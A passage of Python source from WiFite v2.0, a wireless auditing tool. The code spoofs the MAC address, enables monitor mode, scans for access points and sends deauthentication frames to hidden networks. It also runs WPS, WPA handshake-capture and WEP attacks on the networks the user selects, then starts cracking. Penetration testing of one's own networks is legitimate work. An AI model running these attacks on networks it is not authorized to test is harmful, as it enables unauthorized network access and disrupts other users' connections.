            print_red(R + ' [!]' + O + ' The program ' + R + 'reaver' + O + ' is required for WPS attacks' + W)
            print(R + '    ' + O + '   Available at ' + C + 'http://code.google.com/p/reaver-wps' + W)
            self.RUN_CONFIG.WPS_DISABLE = True

        if not program_exists('tshark'):
            printed = True
            print_red(R + ' [!]' + O + ' The program ' + R + 'tshark' + O + ' was not found' + W)
            print(R + ' [!]' + O + ' Please install tshark: https://www.wireshark.org/#download' + W)
            self.RUN_CONFIG.WPS_DISABLE = True

        # Check handshake-checking apps
        recs = ['pyrit', 'cowpatty']
        for rec in recs:
            if program_exists(rec): continue
            printed = True
            print(R + ' [!]' + O + ' The program %s is not required, but is recommended%s' % (R + rec + O, W))
        if printed: print('')

    def enable_monitor_mode(self, iface):
        """
            First attempts to anonymize the MAC if requested; MACs cannot
            be anonymized if they're already in monitor mode.
            Uses airmon-ng to put a device into Monitor Mode.
            Then uses the get_iface() method to retrieve the new interface's name.
            Sets global variable IFACE_TO_TAKE_DOWN as well.
            Returns the name of the interface in monitor mode.
        """
        mac_anonymize(iface)
        iface_str = iface.decode("utf-8") if isinstance(iface, bytes) else iface
        print_green(GR + ' [+] ' + W + ' Enabling monitor mode on %s...' % (G + iface_str + W))
        stdout.flush()
        call(['airmon-ng', 'start', iface], stdout=DN, stderr=DN)
        print('done')
        self.RUN_CONFIG.WIRELESS_IFACE = ''  # remove this reference as we've started its monitoring counterpart
        self.RUN_CONFIG.IFACE_TO_TAKE_DOWN = self.get_iface()
        if self.RUN_CONFIG.TX_POWER > 0:
            print(GR + ' [+]' + W + ' setting Tx power to %s%s%s...' % (G, self.RUN_CONFIG.TX_POWER, W), end=' ')
            call(['iw', 'reg', 'set', 'BO'], stdout=OUTLOG, stderr=ERRLOG)
            call(['iwconfig', iface, 'txpower', self.RUN_CONFIG.TX_POWER], stdout=OUTLOG, stderr=ERRLOG)
            print('done')
        return self.RUN_CONFIG.IFACE_TO_TAKE_DOWN

    def disable_monitor_mode(self):
        """
            The program may have enabled monitor mode on a wireless interface.
            We want to disable this before we exit, so we will do that.
        """
        if self.RUN_CONFIG.IFACE_TO_TAKE_DOWN == '': return
        print_red(GR.decode('utf-8') + ' [+] Disabling monitor mode on %s...' % (G.decode('utf-8') + self.RUN_CONFIG.IFACE_TO_TAKE_DOWN.decode('utf-8') + W.decode('utf-8')), end=' ')
        stdout.flush()
        call(['airmon-ng', 'stop', self.RUN_CONFIG.IFACE_TO_TAKE_DOWN], stdout=DN, stderr=DN)
        print('done')

    def rtl8187_fix(self, iface):
        """
            Attempts to solve "Unknown error 132" common with RTL8187 devices.
            Puts down interface, unloads/reloads driver module, then puts iface back up.
            Returns True if fix was attempted, False otherwise.
        """
        # Check if current interface is using the RTL8187 chipset
        proc_airmon = Popen(['airmon-ng'], stdout=PIPE, stderr=DN)
        proc_airmon.wait()
        using_rtl8187 = False
        for line in proc_airmon.communicate()[0].split():
            line = line.upper()
            if line.strip() == '' or line.startswith('INTERFACE'): continue
            if line.find(iface.upper()) and line.find('RTL8187') != -1: using_rtl8187 = True

        if not using_rtl8187:
            # Display error message and exit
            print(R + ' [!]' + O + ' Unable to generate airodump-ng CSV file' + W)
            print_red(R + ' [!]' + O + ' You may want to disconnect/reconnect your wifi device' + W)
            self.RUN_CONFIG.exit_gracefully(1)

        print(O + " [!]" + W + " attempting " + O + "RTL8187 'Unknown Error 132'" + W + " fix...")

        original_iface = iface
        # Take device out of monitor mode
        airmon = Popen(['airmon-ng', 'stop', iface], stdout=PIPE, stderr=DN)
        airmon.wait()
        for line in airmon.communicate()[0].split('\n'):
            if line.strip() == '' or \
                    line.startswith("Interface") or \
                            line.find('(removed)') != -1:
                continue
            original_iface = line.split()[0]  # line[:line.find('\t')]

        # Remove drive modules, block/unblock ifaces, probe new modules.
        print_and_exec(['ifconfig', original_iface, 'down'])
        print_and_exec(['rmmod', 'rtl8187'])
        print_and_exec(['rfkill', 'block', 'all'])
        print_and_exec(['rfkill', 'unblock', 'all'])
        print_and_exec(['modprobe', 'rtl8187'])
        print_and_exec(['ifconfig', original_iface, 'up'])
        print_and_exec(['airmon-ng', 'start', original_iface])

        print('\r                                                        \r', end=' ')
        print(O + ' [!] ' + W + 'restarting scan...\n')

        return True

    def get_iface(self):
        """
            Get the wireless interface in monitor mode.
            Defaults to only device in monitor mode if found.
            Otherwise, enumerates list of possible wifi devices
            and asks user to select one to put into monitor mode (if multiple).
            Uses airmon-ng to put device in monitor mode if needed.
            Returns the name (string) of the interface chosen in monitor mode.
        """
        if not self.RUN_CONFIG.PRINTED_SCANNING:
            print_green('[+] Scanning for wireless devices...')
            self.RUN_CONFIG.PRINTED_SCANNING = True

        proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
        iface = ''
        monitors = []
        adapters = []
        for line in proc.communicate()[0].split(b'\n'):
            if len(line) == 0: continue
            if line[0] != 32:  # Doesn't start with space
                iface = line[:line.find(b' ')]  # is the interface
            if line.find(b'Mode:Monitor') != -1:
                monitors.append(iface)
            else:
                adapters.append(iface)

        if self.RUN_CONFIG.WIRELESS_IFACE != '':
            if monitors.count(self.RUN_CONFIG.WIRELESS_IFACE):
                return self.RUN_CONFIG.WIRELESS_IFACE
            else:
                if self.RUN_CONFIG.WIRELESS_IFACE in adapters:
                    # valid adapter, enable monitor mode
                    print_red(R + ' [!]' + O + ' Could not find wireless interface %s in monitor mode' % (
                    R + '"' + R + self.RUN_CONFIG.WIRELESS_IFACE + '"' + O))
                    return self.enable_monitor_mode(self.RUN_CONFIG.WIRELESS_IFACE)
                else:
                    # couldnt find the requested adapter
                    print_red(R + ' [!]' + O + ' Could not find wireless interface %s' % (
                    '"' + R + self.RUN_CONFIG.WIRELESS_IFACE + O + '"' + W))
                    self.RUN_CONFIG.exit_gracefully(0)

        if len(monitors) == 1:
            return monitors[0]  # Default to only device in monitor mode
        elif len(monitors) > 1:
            print(GR + " [+]" + W + " interfaces in " + G + "monitor mode:" + W)
            for i, monitor in enumerate(monitors):
                print("  %s. %s" % (G + str(i + 1) + W, G + monitor + W))
            ri = input("%s [+]%s select %snumber%s of interface to use for capturing (%s1-%d%s): %s" % \
                           (GR, W, G, W, G, len(monitors), W, G))
            while not ri.isdigit() or int(ri) < 1 or int(ri) > len(monitors):
                ri = input("%s [+]%s select number of interface to use for capturing (%s1-%d%s): %s" % \
                               (GR, W, G, len(monitors), W, G))
            i = int(ri)
            return monitors[i - 1]

        proc = Popen(['airmon-ng'], stdout=PIPE, stderr=DN)
        for line in proc.communicate()[0].split(b'\n'):
            if len(line) == 0 or line.startswith(b'Interface') or line.startswith(b'PHY'): continue
            monitors.append(line)

        if len(monitors) == 0:
            print_red(R + ' [!]' + O + " No wireless interfaces were found." + W)
            print(R + ' [!]' + O + " You need to plug in a wifi device or install drivers.\n" + W)
            self.RUN_CONFIG.exit_gracefully(0)
        elif self.RUN_CONFIG.WIRELESS_IFACE != '' and monitors.count(self.RUN_CONFIG.WIRELESS_IFACE) > 0:
            monitor = monitors[0][:monitors[0].find('\t')]
            return self.enable_monitor_mode(monitor)

        elif len(monitors) == 1:
            monitor = monitors[0][:monitors[0].find(b'\t')]
            if monitor.startswith(b'phy'): monitor = monitors[0].split()[1]
            return self.enable_monitor_mode(monitor)

        print(GR + " [+]" + W + " available wireless devices:")
        for i, monitor in enumerate(monitors):
            print("  %s%d%s. %s" % (G, i + 1, W, monitor))

        ri = input(
            GR + " [+]" + W + " Select number of device to put into monitor mode (%s1-%d%s): " % (G, len(monitors), W))
        while not ri.isdigit() or int(ri) < 1 or int(ri) > len(monitors):
            ri = input(" [+] Select number of device to put into monitor mode (%s1-%d%s): " % (G, len(monitors), W))
        i = int(ri)
        monitor = monitors[i - 1][:monitors[i - 1].find('\t')]

        return self.enable_monitor_mode(monitor)

    def scan(self, channel=0, iface='', tried_rtl8187_fix=False):
        """
            Scans for access points. Asks user to select target(s).
                "channel" - the channel to scan on, 0 scans all channels.
                "iface"   - the interface to scan on. must be a real interface.
                "tried_rtl8187_fix" - We have already attempted to fix "Unknown error 132"
            Returns list of selected targets and list of clients.
        """
        airodump_file_prefix = os.path.join(self.RUN_CONFIG.temp, 'wifite')
        csv_file = airodump_file_prefix + '-01.csv'
        cap_file = airodump_file_prefix + '-01.cap'
        remove_airodump_files(airodump_file_prefix)

        command = ['airodump-ng',
                   '-a',  # only show associated clients
                   '--write-interval', '1', # Write every second
                   '-w', airodump_file_prefix]  # output file
        if channel != 0:
            command.append('-c')
            command.append(str(channel))
        command.append(iface)

        proc = Popen(command, stdout=DN, stderr=DN)

        time_started = time.time()
        print(GR.encode('utf-8') + b' [+] ' + G.encode('utf-8') + b'initializing scan' + W.encode('utf-8') + b' (' + G.encode('utf-8') + iface + W.encode('utf-8') + b'), updates at 1 sec intervals, ' + G.encode('utf-8') + b'CTRL+C' + W.encode('utf-8') + b' when ready.')
        try:
            deauth_sent = 0.0
            old_targets = []
            stop_scanning = False
            while True:
                time.sleep(0.3)
                if not os.path.exists(csv_file) and time.time() - time_started > 1.0:
                    print(R + '\n [!] ERROR!' + W)
                    # RTL8187 Unknown Error 132 FIX
                    if proc.poll() is not None:  # Check if process has finished
                        proc = Popen(['airodump-ng', iface], stdout=DN, stderr=PIPE)
                        if not tried_rtl8187_fix and proc.communicate()[1].find('failed: Unknown error 132') != -1:
                            send_interrupt(proc)
                            if self.rtl8187_fix(iface):
                                return self.scan(channel=channel, iface=iface, tried_rtl8187_fix=True)
                    print_red(R + ' [!]' + O + ' Wifite is unable to generate airodump-ng output files' + W)
                    print(R + ' [!]' + O + ' You may want to disconnect/reconnect your wifi device' + W)
                    self.RUN_CONFIG.exit_gracefully(1)

                (targets, clients) = self.parse_csv(csv_file)

                # Remove any already cracked networks if configured to do so
                if self.RUN_CONFIG.SHOW_ALREADY_CRACKED == False:
                    index = 0
                    while index < len(targets):
                        already = False
                        for cracked in self.RUN_CONFIG.CRACKED_TARGETS:
                            if targets[index].ssid.lower() == cracked.ssid.lower():
                                already = True
                            if targets[index].bssid.lower() == cracked.bssid.lower():
                                already = True
                        if already == True:
                            targets.pop(index)
                            index -= 1
                        index += 1

                # If we are targeting a specific ESSID/BSSID, skip the scan once we find it.
                if self.RUN_CONFIG.TARGET_ESSID != '':
                    for t in targets:
                        if t.ssid.lower() == self.RUN_CONFIG.TARGET_ESSID.lower():
                            send_interrupt(proc)
                            try:
                                os.kill(proc.pid, SIGTERM)
                            except OSError:
                                pass
                            except UnboundLocalError:
                                pass
                            targets = [t]
                            stop_scanning = True
                            break
                if self.RUN_CONFIG.TARGET_BSSID != '':
                    for t in targets:
                        if t.bssid.lower() == self.RUN_CONFIG.TARGET_BSSID.lower():
                            send_interrupt(proc)
                            try:
                                os.kill(proc.pid, SIGTERM)
                            except OSError:
                                pass
                            except UnboundLocalError:
                                pass
                            targets = [t]
                            stop_scanning = True
                            break

                # If user has chosen to target all access points, wait 20 seconds, then return all
                if self.RUN_CONFIG.ATTACK_ALL_TARGETS and time.time() - time_started > 10:
                    print(GR + '\n [+]' + W + ' auto-targeted %s%d%s access point%s' % (
                    G, len(targets), W, '' if len(targets) == 1 else 's'))
                    stop_scanning = True

                if self.RUN_CONFIG.ATTACK_MIN_POWER > 0 and time.time() - time_started > 10:
                    # Remove targets with power < threshold
                    i = 0
                    before_count = len(targets)
                    while i < len(targets):
                        if targets[i].power < self.RUN_CONFIG.ATTACK_MIN_POWER:
                            targets.pop(i)
                        else:
                            i += 1
                    print(GR + '\n [+]' + W + ' removed %s targets with power < %ddB, %s remain' % \
                                              (G + str(before_count - len(targets)) + W,
                                               self.RUN_CONFIG.ATTACK_MIN_POWER, G + str(len(targets)) + W))
                    stop_scanning = True

                if stop_scanning: break

                # If there are unknown SSIDs, send deauths to them.
                if self.RUN_CONFIG.SEND_DEAUTHS and channel != 0 and time.time() - deauth_sent > 5:
                    deauth_sent = time.time()
                    for t in targets:
                        if t.ssid == '' or '\x00' in t.ssid or '\\x00' in t.ssid:
                            print("\r %s Deauthing Hidden Access Point (%s)               \r" % \
                                  (GR + sec_to_hms(time.time() - time_started) + W, G + t.bssid + W), end=' ')
                            stdout.flush()
                            # Time to deauth
                            cmd = ['aireplay-ng',
                                   '--ignore-negative-one',
                                   '--deauth', str(self.RUN_CONFIG.WPA_DEAUTH_COUNT),
                                   '-a', t.bssid]
                            for c in clients:
                                if c.station == t.bssid:
                                    cmd.append('-c')
                                    cmd.append(c.bssid)
                                    break
                            cmd.append(iface)
                            proc_aireplay = Popen(cmd, stdout=DN, stderr=DN)
                            proc_aireplay.wait()
                            time.sleep(0.5)
                        else:
                            for ot in old_targets:
                                if ot.ssid == '' and ot.bssid == t.bssid:
                                    print('\r %s successfully decloaked "%s"                     ' % \
                                          (GR + sec_to_hms(time.time() - time_started) + W, G + t.ssid + W))

                    old_targets = targets[:]
                if self.RUN_CONFIG.VERBOSE_APS and len(targets) > 0:
                    targets = sorted(targets, key=lambda t: t.power, reverse=True)
                    if not self.RUN_CONFIG.WPS_DISABLE:
                        wps_check_targets(targets, cap_file, verbose=False)

                    os.system('clear')
                    print(str(GR) + '\n [+] ' + str(G) + 'scanning' + str(W) + ' (' + str(G) + str(iface) + str(W) + '), updates at 1 sec intervals, ' + str(G) + 'CTRL+C' + str(W) + ' when ready.\n')



                    print("   NUM ESSID                 %sCH  ENCR  POWER  WPS   CLIENT" % (
                    'BSSID              ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else ''))
                    print('   --- --------------------  %s--  ----  -----  ----  ------' % (
                    '-----------------  ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else ''))
                    for i, target in enumerate(targets):
                        print("   %s%2d%s " % (G, i + 1, W), end=' ')
                        # SSID
                        if target.ssid == '' or '\x00' in target.ssid or '\\x00' in target.ssid:
                            p = O + '(' + target.bssid + ')' + GR + ' ' + W
                            print('%s' % p.ljust(20), end=' ')
                        elif len(target.ssid) <= 20:
                            print("%s" % C + target.ssid.ljust(20) + W, end=' ')
                        else:
                            print("%s" % C + target.ssid[0:17] + '...' + W, end=' ')
                        # BSSID
                        if self.RUN_CONFIG.SHOW_MAC_IN_SCAN:
                            print(O, target.bssid + W, end=' ')
                        # Channel
                        print(G + target.channel.rjust(3), W, end=' ')
                        # Encryption
                        if target.encryption.find("WEP") != -1:
                            print(G, end=' ')
                        else:
                            print(O, end=' ')
                        print("\b%3s" % target.encryption.strip().ljust(4) + W, end=' ')
                        # Power
                        if target.power >= 55:
                            col = G
                        elif target.power >= 40:
                            col = O
                        else:
                            col = R
                        print("%s%3ddb%s" % (col, target.power, W), end=' ')
                        # WPS
                        if self.RUN_CONFIG.WPS_DISABLE:
                            print("  %3s" % (O + 'n/a' + W), end=' ')
                        else:
                            print("  %3s" % (G + 'wps' + W if target.wps else R + ' no' + W), end=' ')
                        # Clients
                        client_text = ''
                        for c in clients:
                            if c.station == target.bssid:
                                if client_text == '':
                                    client_text = 'client'
                                elif client_text[-1] != "s":
                                    client_text += "s"
                        if client_text != '':
                            print('  %s' % (G + client_text + W))
                        else:
                            print('')
                    print('')
                print(' %s %s wireless networks. %s target%s and %s client%s found   \r' % (
                    GR + sec_to_hms(time.time() - time_started) + W, G + 'scanning' + W,
                    G + str(len(targets)) + W, '' if len(targets) == 1 else 's',
                    G + str(len(clients)) + W, '' if len(clients) == 1 else 's'), end=' ')

                stdout.flush()
        except KeyboardInterrupt:
            pass
        print('')

        send_interrupt(proc)
        try:
            os.kill(proc.pid, SIGTERM)
        except OSError:
            pass
        except UnboundLocalError:
            pass

        # Use "tshark" program to check for WPS compatibility
        if not self.RUN_CONFIG.WPS_DISABLE:
            wps_check_targets(targets, cap_file)

        remove_airodump_files(airodump_file_prefix)

        if stop_scanning:
            return (targets, clients)
        print('')

        if len(targets) == 0:
            print_red(R + ' [!]' + O + ' No targets found!' + W)
            print(R + ' [!]' + O + ' You may need to wait for targets to show up.' + W)
            print('')
            self.RUN_CONFIG.exit_gracefully(1)

        if self.RUN_CONFIG.VERBOSE_APS: os.system('clear')

        # Sort by Power
        targets = sorted(targets, key=lambda t: t.power, reverse=True)

        victims = []
        print("   NUM ESSID                 %sCH  ENCR  POWER  WPS?  CLIENT" % (
        'BSSID              ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else ''))
        print('   --- --------------------  %s--  ----  -----  ----  ------' % (
        '-----------------  ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else ''))
        for i, target in enumerate(targets):
            print("   %s%2d%s " % (G, i + 1, W), end=' ')
            # SSID
            if target.ssid == '' or '\x00' in target.ssid or '\\x00' in target.ssid:
                p = O + '(' + target.bssid + ')' + GR + ' ' + W
                print('%s' % p.ljust(20), end=' ')
            elif len(target.ssid) <= 20:
                print("%s" % C + target.ssid.ljust(20) + W, end=' ')
            else:
                print("%s" % C + target.ssid[0:17] + '...' + W, end=' ')
            # BSSID
            if self.RUN_CONFIG.SHOW_MAC_IN_SCAN:
                print(O, target.bssid + W, end=' ')
            # Channel
            print(G + target.channel.rjust(3), W, end=' ')
            # Encryption
            if target.encryption.find("WEP") != -1:
                print(G, end=' ')
            else:
                print(O, end=' ')
            print("\b%3s" % target.encryption.strip().ljust(4) + W, end=' ')
            # Power
            if target.power >= 55:
                col = G
            elif target.power >= 40:
                col = O
            else:
                col = R
            print("%s%3ddb%s" % (col, target.power, W), end=' ')
            # WPS
            if self.RUN_CONFIG.WPS_DISABLE:
                print("  %3s" % (O + 'n/a' + W), end=' ')
            else:
                print("  %3s" % (G + 'wps' + W if target.wps else R + ' no' + W), end=' ')
            # Clients
            client_text = ''
            for c in clients:
                if c.station == target.bssid:
                    if client_text == '':
                        client_text = 'client'
                    elif client_text[-1] != "s":
                        client_text += "s"
            if client_text != '':
                print('  %s' % (G + client_text + W))
            else:
                print('')

        ri = input(
            GR + "\n [+]" + W + " select " + G + "Target numbers" + W + " (" + G + "1-%s)" % (str(len(targets)) + W) + \
            " separated by commas, or '%s': " % (G + 'all' + W))
        if ri.strip().lower() == 'all':
            victims = targets[:]
        else:
            for r in ri.split(','):
                r = r.strip()
                if r.find('-') != -1:
                    (sx, sy) = r.split('-')
                    if sx.isdigit() and sy.isdigit():
                        x = int(sx)
                        y = int(sy) + 1
                        for v in range(x, y):
                            victims.append(targets[v - 1])
                elif not r.isdigit() and r.strip() != '':
                    print_red(O + " [!]" + R + " Not a number: %s " % (O + r + W))
                elif r != '':
                    victims.append(targets[int(r) - 1])

        if len(victims) == 0:
            print_red(O + '\n [!] ' + R + 'No targets selected.\n' + W)
            self.RUN_CONFIG.exit_gracefully(0)

        print('')
        print(' [+] %s%d%s target%s selected.' % (G, len(victims), W, '' if len(victims) == 1 else 's'))

        return (victims, clients)

    def Start(self):
        self.RUN_CONFIG.CreateTempFolder()
        self.RUN_CONFIG.handle_args()
        self.RUN_CONFIG.ConfirmRunningAsRoot()
        self.RUN_CONFIG.ConfirmCorrectPlatform()

        self.initial_check()  # Ensure required programs are installed.

        # Use an interface already in monitor mode if it has been provided,
        if self.RUN_CONFIG.MONITOR_IFACE != '':
            iface = self.RUN_CONFIG.MONITOR_IFACE
        else:
            # The "get_iface" method anonymizes the MAC address (if needed)
            # and puts the interface into monitor mode.
            iface = self.get_iface()
        self.RUN_CONFIG.THIS_MAC = get_mac_address(iface)  # Store current MAC address

        (targets, clients) = self.scan(iface=iface, channel=self.RUN_CONFIG.TARGET_CHANNEL)

        try:
            index = 0
            while index < len(targets):
                target = targets[index]
                # Check if we have already cracked this target
                for already in RUN_CONFIG.CRACKED_TARGETS:
                    if already.bssid == targets[index].bssid:
                        if RUN_CONFIG.SHOW_ALREADY_CRACKED == True:
                            print(R + '\n [!]' + O + ' You have already cracked this access point\'s key!' + W)
                            print(R + ' [!] %s' % (C + already.ssid + W + ': "' + G + already.key + W + '"'))
                            ri = input(
                                GR + ' [+] ' + W + 'Do you want to crack this access point again? (' + G + 'y/' + O + 'n' + W + '): ')
                            if ri.lower() == 'n':
                                targets.pop(index)
                                index -= 1
                        else:
                            targets.pop(index)
                            index -= 1
                        break

                # Check if handshakes already exist, ask user whether to skip targets or save new handshakes
                handshake_file = RUN_CONFIG.WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) \
                                 + '_' + target.bssid.replace(':', '-') + '.cap'
                if os.path.exists(handshake_file):
                    print(R + '\n [!] ' + O + 'You Already Have Handshake File For %s:' % (C + target.ssid + W))
                    print('        %s\n' % (G + handshake_file + W))
                    print(GR + ' [+]' + W + ' Do you want to ' + G + '[s]kip' + W + ', ' + O + '[c]apture again' + W + ', or ' + R + '[o]verwrite' + W + '?')
                    ri = 'x'
                    while ri != 's' and ri != 'c' and ri != 'o':
                        ri = input(
                            GR + ' [+] ' + W + 'enter ' + G + 's' + W + ', ' + O + 'c,' + W + ' or ' + R + 'o' + W + ': ' + G).lower()
                    print(W + "\b", end=' ')
                    if ri == 's':
                        targets.pop(index)
                        index -= 1
                    elif ri == 'o':
                        remove_file(handshake_file)
                        continue
                index += 1


        except KeyboardInterrupt:
            print('\n ' + R + '(^C)' + O + ' interrupted\n')
            self.RUN_CONFIG.exit_gracefully(0)

        wpa_success = 0
        wep_success = 0
        wpa_total = 0
        wep_total = 0

        self.RUN_CONFIG.TARGETS_REMAINING = len(targets)
        for t in targets:
            self.RUN_CONFIG.TARGETS_REMAINING -= 1

            # Build list of clients connected to target
            ts_clients = []
            for c in clients:
                if c.station == t.bssid:
                    ts_clients.append(c)

            print('')
            if t.encryption.find('WPA') != -1:
                need_handshake = True
                if not self.RUN_CONFIG.WPS_DISABLE and t.wps:
                    wps_attack = WPSAttack(iface, t, self.RUN_CONFIG)
                    need_handshake = not wps_attack.RunAttack()
                    wpa_total += 1

                if not need_handshake: wpa_success += 1
                if self.RUN_CONFIG.TARGETS_REMAINING < 0: break

                if not self.RUN_CONFIG.PIXIE and not self.RUN_CONFIG.WPA_DISABLE and need_handshake:
                    wpa_total += 1
                    wpa_attack = WPAAttack(iface, t, ts_clients, self.RUN_CONFIG)
                    if wpa_attack.RunAttack():
                        wpa_success += 1

            elif t.encryption.find('WEP') != -1:
                wep_total += 1
                wep_attack = WEPAttack(iface, t, ts_clients, self.RUN_CONFIG)
                if wep_attack.RunAttack():
                    wep_success += 1

            else:
                print_red(R + ' Unknown encryption:', t.encryption, W)

            # If user wants to stop attacking
            if self.RUN_CONFIG.TARGETS_REMAINING <= 0: break

        if wpa_total + wep_total > 0:
            # Attacks are done! Show results to user
            print('')
            print_green(GR + ' [+] %s%d Attack%s Completed:%s' % (
            G, wpa_total + wep_total, '' if wpa_total + wep_total == 1 else 's', W))
            print('')
            if wpa_total > 0:
                if wpa_success == 0:
                    print(GR + ' [+]' + R, end=' ')
                elif wpa_success == wpa_total:
                    print(GR + ' [+]' + G, end=' ')
                else:
                    print(GR + ' [+]' + O, end=' ')
                print_green('%d/%d%s WPA Attacks Succeeded' % (wpa_success, wpa_total, W))

                for finding in self.RUN_CONFIG.WPA_FINDINGS:
                    print('        ' + C + finding + W)

            if wep_total > 0:
                if wep_success == 0:
                    print(GR + ' [+]' + R, end=' ')
                elif wep_success == wep_total:
                    print(GR + ' [+]' + G, end=' ')
                else:
                    print(GR + ' [+]' + O, end=' ')
                print_green('%d/%d%s WEP Attacks Succeeded' % (wep_success, wep_total, W))

                for finding in self.RUN_CONFIG.WEP_FINDINGS:
                    print('        ' + C + finding + W)

            caps = len(self.RUN_CONFIG.WPA_CAPS_TO_CRACK)
            if caps > 0 and not self.RUN_CONFIG.WPA_DONT_CRACK:
                print(GR + ' [+]' + W + ' starting ' + G + 'WPA cracker' + W + ' on %s%d handshake%s' % (
                G, caps, W if caps == 1 else 's' + W))
                for cap in self.RUN_CONFIG.WPA_CAPS_TO_CRACK:
                    wpa_crack(cap, self.RUN_CONFIG)

        print('')
        self.RUN_CONFIG.exit_gracefully(0)

    def parse_csv(self, filename):
        """
            Parses given lines from airodump-ng CSV file.
            Returns tuple: List of targets and list of clients.
        """
        if not os.path.exists(filename): return ([], [])
        targets = []
        clients = []
        try:
            hit_clients = False
            with open(filename, 'rb') as csvfile:
                targetreader = csv.reader((line.decode('utf-8').replace('\0', '') for line in csvfile), delimiter=',')
                for row in targetreader:
                    if len(row) < 2:
                        continue
                    if not hit_clients:
                        if row[0].strip() == 'Station MAC':
                            hit_clients = True
                            continue
                        if len(row) < 14:
                            continue
                        if row[0].strip() == 'BSSID':
                            continue
                        enc = row[5].strip()
                        wps = False
                        # Ignore non-WPA and non-WEP encryption
                        if enc.find('WPA') == -1 and enc.find('WEP') == -1: continue
                        if self.RUN_CONFIG.WEP_DISABLE and enc.find('WEP') != -1: continue
                        if self.RUN_CONFIG.WPA_DISABLE and self.RUN_CONFIG.WPS_DISABLE and enc.find(
                                'WPA') != -1: continue
                        if enc == "WPA2WPA" or enc == "WPA2 WPA":
                            enc = "WPA2"
                            wps = True
                        if len(enc) > 4:
                            enc = enc[4:].strip()
                        power = int(row[8].strip())

                        ssid = row[13].strip()
                        ssidlen = int(row[12].strip())
                        ssid = ssid[:ssidlen]

                        if power < 0: power += 100
                        t = Target(row[0].strip(), power, row[10].strip(), row[3].strip(), enc, ssid)
                        t.wps = wps
                        targets.append(t)
                    else:
                        if len(row) < 6:
                            continue
                        bssid = re.sub(r'[^a-zA-Z0-9:]', '', row[0].strip())
                        station = re.sub(r'[^a-zA-Z0-9:]', '', row[5].strip())
                        power = row[3].strip()
                        if station != 'notassociated':
                            c = Client(bssid, station, power)
                            clients.append(c)
        except IOError as e:
            print("I/O error({0}): {1}".format(e.errno, e.strerror))
            return ([], [])

        return (targets, clients)

    def analyze_capfile(self, capfile):
        """
            Analyzes given capfile for handshakes using various programs.
            Prints results to console.
        """
        # we're not running an attack
        wpa_attack = WPAAttack(None, None, None, None)

        if self.RUN_CONFIG.TARGET_ESSID == '' and self.RUN_CONFIG.TARGET_BSSID == '':
            print(R + ' [!]' + O + ' Target SSID and BSSID are required to check for handshakes')
            print(R + ' [!]' + O + ' Please enter essid (access point name) using -e <name>')
            print(R + ' [!]' + O + ' And/or target bssid (mac address) using -b <mac>\n')
            # exit_gracefully(1)

        if self.RUN_CONFIG.TARGET_BSSID == '':
            # Get the first BSSID found in tshark!
            self.RUN_CONFIG.TARGET_BSSID = get_bssid_from_cap(self.RUN_CONFIG.TARGET_ESSID, capfile)
            # if TARGET_BSSID.find('->') != -1: TARGET_BSSID == ''
            if self.RUN_CONFIG.TARGET_BSSID == '':
                print_red(R + ' [!]' + O + ' Unable to guess BSSID from ESSID!')
            else:
                print_red(GR + ' [+]' + W + ' Guessed BSSID: %s' % (G + self.RUN_CONFIG.TARGET_BSSID + W))

        if self.RUN_CONFIG.TARGET_BSSID != '' and self.RUN_CONFIG.TARGET_ESSID == '':
            self.RUN_CONFIG.TARGET_ESSID = get_essid_from_cap(self.RUN_CONFIG.TARGET_BSSID, capfile)

        print(GR + '\n [+]' + W + ' Checking for Handshakes in %s' % (G + capfile + W))

        t = Target(self.RUN_CONFIG.TARGET_BSSID, '', '', '', 'WPA', self.RUN_CONFIG.TARGET_ESSID)

        if program_exists('pyrit'):
            result = wpa_attack.has_handshake_pyrit(t, capfile)
            print(GR + ' [+]' + W + '    ' + G + 'pyrit' + W + ':\t\t\t %s' % (
            G + 'found!' + W if result else O + 'not found' + W))
        else:
            print_red(R + ' [!]' + O + ' Program not found: pyrit')
        if program_exists('cowpatty'):
            result = wpa_attack.has_handshake_cowpatty(t, capfile, nonstrict=True)
            print(GR + ' [+]' + W + '    ' + G + 'cowpatty' + W + ' (nonstrict):\t %s' % (
            G + 'found!' + W if result else O + 'not found' + W))
            result = wpa_attack.has_handshake_cowpatty(t, capfile, nonstrict=False)
            print(GR + ' [+]' + W + '    ' + G + 'cowpatty' + W + ' (strict):\t %s' % (
            G + 'found!' + W if result else O + 'not found' + W))
        else:
            print(R + ' [!]' + O + ' program not found: cowpatty')
        if program_exists('tshark'):
            result = wpa_attack.has_handshake_tshark(t, capfile)
            print(GR + ' [+]' + W + '    ' + G + 'tshark' + W + ':\t\t\t %s' % (
            G + 'found!' + W if result else O + 'not found' + W))
        else:
            print(R + ' [!]' + O + ' program not found: tshark')
        if program_exists('aircrack-ng'):
            result = wpa_attack.has_handshake_aircrack(t, capfile)
            print(GR + ' [+]' + W + '    ' + G + 'aircrack-ng' + W + ':\t\t %s' % (
            G + 'found!' + W if result else O + 'not found' + W))
        else:
            print(R + ' [!]' + O + ' program not found: aircrack-ng')

        print('')

        self.RUN_CONFIG.exit_gracefully(0)


##################
# MAIN FUNCTIONS #
##################

##############################################################
### End Classes

def rename(old, new):
    """
        Renames file 'old' to 'new', works with separate partitions.
        Thanks to hannan.sadar
    """
    try:
        os.rename(old, new)
    except os.error as detail:
        if detail.errno == errno.EXDEV:
            try:
                copy(old, new)
            except:
                os.unlink(new)
                raise
                os.unlink(old)
        # if desired, deal with other errors
        else:
            raise


def banner(RUN_CONFIG):
    """
        Displays ASCII art of the highest caliber.
    """
    print('')
    print(G + "  .;'                     `;,    ")
    print(G + " .;'  ,;'             `;,  `;,   " + W + "WiFite v2.0 (r" + str(RUN_CONFIG.REVISION) + ")")
    print(G + ".;'  ,;'  ,;'     `;,  `;,  `;,  ")
    print(G + "::   ::   :   " + GR + "( )" + G + "   :   ::   ::  " + GR + "automated wireless auditor")
    print(G + "':.  ':.  ':. " + GR + "/_\\" + G + " ,:'  ,:'  ,:'  ")
    print(G + " ':.  ':.    " + GR + "/___\\" + G + "    ,:'  ,:'   " + G + "try the new version:")
    print(G + "  ':.       " + GR + "/_____\\" + G + "      ,:'     " + C + "https://github.com/derv82/wifite2")
    print(G + "           " + GR + "/       \\" + G + "             ")
    print(W)


def help():
    """
